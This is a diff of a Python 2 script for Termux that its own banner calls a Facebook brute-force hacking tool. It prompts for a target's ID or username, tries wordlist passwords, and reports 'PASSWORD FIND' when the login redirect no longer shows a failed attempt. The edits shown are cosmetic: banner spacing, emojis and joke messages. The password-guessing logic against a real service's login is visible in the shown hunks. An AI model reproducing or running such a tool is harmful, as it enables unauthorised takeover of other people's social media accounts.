@@ -46,14 +46,14 @@ def banner():
     runntxt(GG+"           Semoga Bisa Membantu")
     time.sleep(1.5)
     print GG+"  √=============================================√"
-    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK B-F.   ••••••|"
+    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK B-F.  ••••••|"
     print GG+"  √=============================================√"
-    print WW+"  |            CREATE BY: PAK STEVEN             |"
+    print WW+"  |            CREATE BY: PAK STEVEN            |"
     print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
     print WW+"  |.            ~~~~~~~~~~~~~~~~~~~.            |"
     print Y+"  |        TELEGRAM GROUP @TermuxUserBrute.      |"
     print GL+"  |---------------------------------------------|"
-    print GL+"  |          SEMOGA TIDAK KENA BANNED|"
+    print GL+"  |          SEMOGA TIDAK KENA BANNED           |"
     print GL+"  |---------------------------------------------|"
     print GG+"  √=============================================√"
     print GL+"  |••••••••••• RESIKO TANGGUNG SENDIRI •••••••••|"
@@ -61,7 +61,7 @@ def banner():
 
 banner()
 
-print wd+"         gunakan dengan bijak cok "
+print wd+"🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩🇮🇩 "
 print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
 email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
 print " "
@@ -111,7 +111,7 @@ def main():
         runn_noobs()
         life()
         print " "
-        print RR+" wordlist tidak ada yg cocok..."
+        print RR+" Ketahuan Belum mandi...🤔"
         print " "
 def iqbalz(iqbalz_password):
   try:
@@ -126,7 +126,7 @@ def iqbalz(iqbalz_password):
 	mask = tom.geturl()
 	if mask != login and (not 'login_attempt' in mask):
                         print " "
-			print ("\033[96m                S U C C E S S")
+			print ("\033[96m                D E T E C T E D")
 			print "          P A S S W O R D  F I N D "
                   	print RR+"+-------------------------------------------+"
 	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
